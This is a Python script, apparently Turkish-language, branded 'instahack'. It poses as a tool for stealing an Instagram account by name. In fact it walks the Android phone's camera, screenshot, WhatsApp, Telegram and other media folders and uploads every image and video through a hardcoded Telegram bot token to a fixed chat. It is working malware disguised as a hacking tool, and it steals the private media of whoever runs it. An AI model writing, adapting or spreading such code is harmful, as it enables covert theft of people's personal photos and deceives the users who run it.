import os
import sys

# requests modülünü kontrol et ve yükle
try:
    import requests
except ImportError:
    print("requests modülü bulunamadı. Yükleniyor...")
    os.system(f"{sys.executable} -m pip install requests")
    import requests

# Ekranı temizle
os.system("cls" if os.name == "nt" else "clear")

# ASCII SANATI
print(r"""
 _           _        _                _    
(_)         | |      | |              | |   
 _ _ __  ___| |_ __ _| |__   __ _  ___| | __
| | '_ \/ __| __/ _` | '_ \ / _` |/ __| |/ /
| | | | \__ \ || (_| | | | | (_| | (__|   < 
|_|_| |_|___/\__\__,_|_| |_|\__,_|\___|_|\_\
""")

BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
USER_ID = "6044093818"

name = input("Lütfen Çalmak istediğiniz Instagram hesabının ismini giriniz: ")

directories = [
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Pictures/Screenshots/",
    "/storage/emulated/0/DCIM/Screenshots/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video/",
    "/storage/emulated/0/Pictures/Instagram/",
    "/storage/emulated/0/Movies/Instagram/",
    "/storage/emulated/0/Pictures/Facebook/",
    "/storage/emulated/0/Movies/CapCut/",
    "/storage/emulated/0/Pictures/CapCut/",
    "/storage/emulated/0/Pictures/Snapchat/",
    "/storage/emulated/0/Pictures/PicsArt/",
    "/storage/emulated/0/Movies/Snapchat/", 
    "/storage/emulated/0/Pictures/Twitter/",
    "/storage/emulated/0/Movies/Twitter/",
    "/storage/emulated/0/Download/Telegram/",
    "/storage/emulated/0/Pictures/Telegram/",
    "/storage/emulated/0/Movies/",
    "/storage/emulated/0/Pictures/100PINT/Pins/",
    "/storage/emulated/0/Videos/",
    "/storage/emulated/0/DCIM/.thumbnails/"
]

image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
video_extensions = [".mp4", ".mov", ".avi"]

def send_media_to_user(file_path, directory_name):
    print(f"Dosya gönderiliyor: {file_path}")
    
    if file_path.endswith(tuple(image_extensions)):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        media_type = "photo"
        caption = f"Kaynak Dizin: {directory_name}"
    elif file_path.endswith(tuple(video_extensions)):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        media_type = "video"
        caption = f"Kaynak Dizin: {directory_name}"
    else:
        print(f"Desteklenmeyen dosya türü: {file_path}")
        return

    with open(file_path, "rb") as media_file:
        data = {"chat_id": USER_ID, "caption": caption}
        files = {media_type: media_file}

        response = requests.post(url, data=data, files=files)

        if response.status_code == 200:
            print(f"Başarıyla gönderildi: {file_path}")
        else:
            print(f"Dosya gönderilemedi: {file_path}. Hata: {response.status_code} - {response.text}")

def check_and_send_files():
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(tuple(image_extensions + video_extensions)):
                        send_media_to_user(file_path, directory)
    
    print("\nTüm işlemler başarıyla tamamlandı!")

check_and_send_files()
